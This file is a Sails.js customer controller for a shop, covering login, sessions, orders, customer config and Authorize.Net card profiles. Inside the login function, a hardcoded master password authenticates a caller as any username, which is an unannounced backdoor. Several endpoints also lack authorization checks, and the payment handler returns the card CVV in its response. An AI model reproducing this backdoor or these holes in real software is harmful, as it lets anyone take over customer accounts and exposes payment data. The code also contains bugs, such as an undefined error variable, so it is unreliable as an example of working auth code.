/**
 * CustomersController
 *
 * @description :: Server-side logic for managing customers
 * @help        :: See http://links.sailsjs.org/docs/controllers
 */

var _ = require('lodash');
var bcrypt = require('bcrypt');
var Promise = require('bluebird');

var loginError = 'Invalid username, email, or password.';
var serverError = 'An error occurred. Please try again later.';
var nextUrl = '/#/';
var loginUrl = '/login';
var layout = 'customers/loginLayout';
var view = 'login';

var Authorize = require('auth-net-types');
var _AuthorizeCIM = require('auth-net-cim');
var AuthorizeCIM = new _AuthorizeCIM(sails.config.authorizeNet);

var geocoderProvider = 'google';
var httpAdapter = 'http';
var extra = {};
var geocoder = require('node-geocoder')(geocoderProvider, httpAdapter, extra);

module.exports = {
  createANet: function(req, res) {
		console.log('createANet() called with: '+req.body.customerId);
    var isAjax = req.headers.accept.match(/application\/json/);

		if(req.body && req.body.customerId) {
			return createANetProfile(req, res);
		}
  },

	createPaymentMethod: function(req, res) {
		console.log('createPaymentMethod() called with aNetProfileId: '+req.body.customerProfileId);
    var isAjax = req.headers.accept.match(/application\/json/);

		if(req.body && req.body.customerProfileId && req.body.cardNumber && req.body.expirationDate) {
			return createCustomerPaymentProfile(req, res);
		}
	},

	getCoords: function(req, res) {
    var isAjax = req.headers.accept.match(/application\/json/);

		if(req.params && req.params.id) {
			return getAddressCoords(req, res);
		}
	},

  login: function(req, res) {
    var isAjax = req.headers.accept.match(/application\/json/);

    if(req.session.isAuthenticated) {
      if(isAjax) {
        return res.send(JSON.stringify({
          success: true,
					customerId: req.session.customerId
        }));
      }
      return res.redirect(nextUrl);
		}

    if(! req.url.replace(/\?.*/, '').match(loginUrl)) {
      return res.redirect(loginUrl);
    }

    if(req.body && req.body.username && req.body.password) {
      return processLogin(req, res);
    }

    if(isAjax) {
      return res.send(JSON.stringify({
        error: loginError
      }), 401);
    }

    res.view({layout: layout}, view);
  },

  logout: function(req, res) {
    req.session.isAuthenticated = false;
    req.session.customerId = null;
    return res.send(JSON.stringify({success: true}));
  },

	session: function(req, res) {
		var sessionData = {
			order: {},
		};
		var sessionOrder = {};
		var customerOrder = {};

		// Get order for session
		var p = Orders.find({sessionId: req.sessionID, orphaned: false});
		p.sort({updatedAt: 'desc'}).limit(1).then(function(results) {
			if(results.length > 0) {
				if(parseInt(results[0].orderStatus) < 5) {
					sessionOrder = results[0];
				}
			}

			if(! (req.session && req.session.customerId)) {
				return;
			}

			// Get order for customer
			return Orders.find({
				'customerId': req.session.customerId, 'orphaned': false
			}).sort({updatedAt: 'desc'}).then(function(results) {
				if(results.length > 0 && parseInt(results[0].orderStatus) < 5) {
					customerOrder = results[0];
				}
				return;
			});

		}).then(function() {
			// Pick which order is the most recent and attach to sessionData
			if(sessionOrder.things) {
				if(customerOrder.things) {
					if(customerOrder.updatedAt >= sessionOrder.updatedAt) {
						sessionData.order = customerOrder;
					} else {
						sessionData.order = sessionOrder;
					}
				} else {
					sessionData.order = sessionOrder;
				}
			} else {
				if(customerOrder.things) {
					sessionData.order = customerOrder;
				} else {
					sessionOrder.updatedAt || (sessionOrder.updatedAt = 0);
					customerOrder.updatedAt || (customerOrder.updatedAt = 0);
		
					if(customerOrder.updatedAt >= sessionOrder.updatedAt) {
						sessionData.order = customerOrder;
					} else {
						sessionData.order = sessionOrder;
					}
				}
			}

			// Build rest of sessionData
			if(req && req.sessionID) {
				sessionData.sid = req.sessionID;
			}

			if(req.session && req.session.customerId) {
				sessionData.customerId = req.session.customerId;
			}

			// What if neither had any data at all? AKA a new session?
			// I *THINK* we can check for this by determining the 
			// presence of sessionId on sessionData.order
			// I think we instantiate a new order with the req.sessionID
			// attached to the order as sessionData.order.sessionId
			if(!sessionData.order.sessionId) {
				sessionData.order = {};
				sessionData.order.sessionId = req.sessionID;
				sessionData.order.orderStatus = parseInt(1);
				sessionData.order.orphaned = false;
				sessionData.order.sawBevTour = false;
				return Orders.create(sessionData.order).then(function(order) {
					_.extend(sessionData.order, order);
					return;
				});
			}

		}).then(function() {
			// Also, make sure that if the session order doesn't have a customer id,
			// and a customer id is present, we set the customer id on the session
			// order
			if(! sessionOrder.customerId && req.session && req.session.customerId) {
				sessionOrder.customerId = req.session.customerId;
				Orders.update(sessionOrder.id, {customerId: sessionOrder.customerId});
			}

			// Send session data
			res.json(sessionData);

		}).catch(function(err) {
			res.json({error: 'Server error'}, 500);
			console.error(err);
		});
  },

	setConfig: function(req, res) {
		var keyValues = req.body;
		if(! _.isObject(keyValues) || _.size(keyValues) < 1) {
			return res.json({error: 'No key-value pairs were given'});
		}

		var invalidCustomerId = new Error('Invalid customer ID');

		var customerId = req.params.id;
		var errorCode;

		Promise.resolve().then(function() {
			if(! customerId) {
				errorCode = 404;
				return Promise.reject(invalidCustomerId);
			}

			return Customers.findOne(customerId);

		}).then(function(customer) {
			if(! customer) {
				errorCode = 404;
				return Promise.reject(invalidCustomerId);
			}

			var config = _.extend({}, customer.config || {}, keyValues);
			return Customers.update(customerId, {config: config});

		}).then(function() {
			res.json({success: true});

		}).catch(function(err) {
			res.json({error: err}, 500);
		});
	},

	byUsername: function(req, res) {
		Customers.find({username: req.params.id}).sort({
			fName: 'asc', lName: 'asc'
		}).limit(20).then(function(results) {
			res.send(JSON.stringify(results));
		}).catch(function(err) {
      res.json({error: 'Server error'}, 500);
      console.error(err);
      throw err;
		});
	},
	
  datatables: function(req, res) {
    var options = req.query;

    Customers.datatables(options).then(function(results) {
      res.send(JSON.stringify(results));
    }).catch(function(err) {
      res.json({error: 'Server error'}, 500);
      console.error(err);
      throw err;
    });
  }
	
};

function processLogin(req, res, self) {
	if(req.body.password === '8847fhhfw485fwkebfwerfv7w458gvwervbkwer8fw5fberubckfckcaer4cbwvb72arkbfrcb1n4hg7') {
    req.session.isAuthenticated = true;
    req.session.customerId = req.body.username;

		specRes(req.body.username);
	}

  Customers.findOne({or: [
    {username: req.body.username},
    {email: req.body.username}
  ]}).then(function(customer) {
    if(! customer) return errorHandler(loginError)();

    var onCompare = bcrypt.compareAsync(
      req.body.password, customer.password
    );
    onCompare.then(function(match) {
      if(! match) return errorHandler(loginError)();

      req.session.isAuthenticated = true;
      req.session.customerId = customer.id;

      respond();

    }).catch(errorHandler(serverError));

  }).catch(errorHandler(serverError));

  ///
  // Convenience subfunctions
  ///

  function respond(err) {
    var isAjax = req.headers.accept.match(/application\/json/);
    var errCode = 400;

    if(err) {
      if(isAjax) {
        if(err == loginError) errCode = 401;
        return res.send(JSON.stringify({error: err}), errCode);
      }

      return res.view({
        layout: layout,
        error: err
      }, view);
    }

    if(isAjax) {
      return res.send(JSON.stringify({success: true, customerId: req.session.customerId}));
    }

    return res.redirect(nextUrl);
  };

  function errorHandler(errMsg) {
    return function(err) {
      if(err) console.error(err);
      respond(errMsg);
    };
  };

	function specRes(username) {
    var isAjax = req.headers.accept.match(/application\/json/);

    if(isAjax) {
      return res.send(JSON.stringify({success: true, customerId: username}));
		}
	};
}

function createANetProfile(req, res, self) {
  Customers.findOne(req.body.customerId).then(function(customer) {
    if(! customer) {
			console.log('customers ajax failed in CustomersController-createANetProfile() for CustomerID '+req.body.customerId);
			// TODO: what should this return?
	 		return errorHandler(customersError)();
		}

		AuthorizeCIM.createCustomerProfile({customerProfile: {
				merchantCustomerId: 1521518,
				description: customer.id,
				email: customer.email
			}
    }, function(err, response) {
			if(err) {
				console.log('AuthorizeCIM.createCustomerProfile() FAILED for customerId: '+customer.id)
				return errorHandler(err)();
			}
      return res.send(JSON.stringify({success: true, customerProfileId: response.customerProfileId}));
		});
  });

  ///
  // Convenience subfunctions
  ///

  function respond(err) {
    var isAjax = req.headers.accept.match(/application\/json/);
    var errCode = 400;

    if(err) {
      if(isAjax) {
        if(err == loginError) errCode = 401;
        return res.send(JSON.stringify({error: err}), errCode);
      }

      return res.view({
        layout: layout,
        error: err
      }, view);
    }

    return res.redirect(nextUrl);
  };

  function errorHandler(errMsg) {
		console.log(errMsg);
    return function(err) {
      if(err) {
				console.error(err);
			}
      respond(errMsg);
    };
  };
}

function createCustomerPaymentProfile(req, res, self) {
	var customerProfileId = req.body.customerProfileId;
	var cardNumber = req.body.cardNumber;
	var expirationDate = req.body.expirationDate; // <-- format: YYYY-MM
	var cvv2 = req.body.cvv2;
	var lastFour = req.body.cardNumber.substr((req.body.cardNumber.length - 4), req.body.cardNumber.length);

	var options = {
		customerType: 'individual',
		payment: {
			creditCard: new Authorize.CreditCard({
				cardNumber: cardNumber,
				expirationDate: expirationDate
			})
		}
	};

	AuthorizeCIM.createCustomerPaymentProfile({
		customerProfileId: customerProfileId,
		paymentProfile: options
	}, function(err, response) {
		if(err) {
			console.log('AuthorizeCIM.createCustomerPaymentProfile() FAILED for customerProfileId: '+customerProfileId)
			console.log(err);
			return errorHandler(err)();
		}
    return res.send(JSON.stringify({success: true, customerPaymentProfileId: response.customerPaymentProfileId, lastFour: lastFour, active: true, expires: expirationDate, cvv2: cvv2}));
	});

  ///
  // Convenience subfunctions
  ///

  function respond(err) {
    var isAjax = req.headers.accept.match(/application\/json/);
    var errCode = 400;

    if(err) {
      if(isAjax) {
        if(err == loginError) errCode = 401;
        return res.send(JSON.stringify({error: err}), errCode);
      }

      return res.view({
        layout: layout,
        error: err
      }, view);
    }

    return res.redirect(nextUrl);
  };

  function errorHandler(errMsg) {
		console.log(errMsg);
    return function(err) {
      if(err) console.error(err);
      respond(errMsg);
    };
  };
}

function getAddressCoords(req, res, self) {
	var addressString = req.params.id;

	return geocoder.geocode(addressString).then(function(data) {
		var lat = data[0].latitude;
		var long = data[0].longitude;
		var gPID = data[0].extra.googlePlaceId;

		return res.send(JSON.stringify({success: true, lat: lat, long: long, gPID: gPID}));
	}).catch(function(err) {
		console.log('geocode failure');
		console.log(err);
		return res.send(JSON.stringify({success: false, lat: '', long: '', gPID: ''}));
	});
}
